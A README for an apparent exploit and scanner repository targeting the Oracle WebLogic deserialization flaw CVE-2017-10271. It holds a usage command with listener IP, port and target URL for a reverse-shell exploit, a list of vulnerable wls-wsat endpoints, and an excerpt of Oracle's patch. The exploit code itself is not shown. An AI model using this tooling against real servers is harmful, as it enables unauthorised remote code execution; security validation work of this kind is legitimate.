# CVE-2017-10271

Weblogic wls-wsat Component Deserialization Vulnerability (CVE-2017-10271) Detection and Exploitation Script

### Usage

```bash
$ python CVE-2017-10271.py -l 10.10.10.10 -p 4444 -r http://will.bepwned.com:7001/
```

### Features

* Standalone Python script
  * Check functionality to see if any host is vulnerable
  * Exploit functionality for Linux targets
* Metasploit module
  * Check functionality to see if any host is vulnerable
  * Exploit functionality for all targets
* Scanner (./scanners)
  * Checks to see if hosts is vulnerable. Fully self-contained

## Legal Notices

You are responsible for the use of this script. Kevin Kirsche takes no responsibility for any actions taken using the code here. The code was created for teams looking to validate the security of their servers, not for malicious use.

## Thanks

Big thanks to Luffin for creating the original POC that this was based on https://github.com/Luffin/CVE-2017-10271

## Vulnerable URL's other than the one shown:

```
/wls-wsat/CoordinatorPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/ParticipantPortType
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/RegistrationRequesterPortType11
```

## Related Vulnerability
CVE 2017-3506

## Oracle's Patch

Source:
https://blog.nsfocusglobal.com/threats/vulnerability-analysis/technical-analysis-and-solution-of-weblogic-server-wls-component-vulnerability/

```java
private void validate(InputStream is) {
 WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
 
 try {
  SAXParser parser = factory.newSAXParser();
  
  parser.parse(is, new DefaultHandler()) {
   private int overallarraylength = 0;
   
   public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXEception {
    if (qName.equalsIgnoreCase("object")) {
     throw new IllegalStateException("Invalid element qName:object");
    } else if (qName.equalsIgnoreCase("new")) {
     throw new IllegalStateException("Invalid element qName:new");
    } else if (qName.equalsIgnoreCase("method")) {
     throw new IllegalStateException("Invalid element qName:method");
    } else {
     if (qName.equalsIgnoreCase("void")) {
      for(int attClass = 0;attClass < attributes.getLength(); ++attClass) {
       if (!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
        throw new IllegalStateException("Invalid attribute for element void: " + attributes.getQName(attClass));
       }
      }
     }
     
     ... more code here ...
    }
   }
  }
 }
}
```
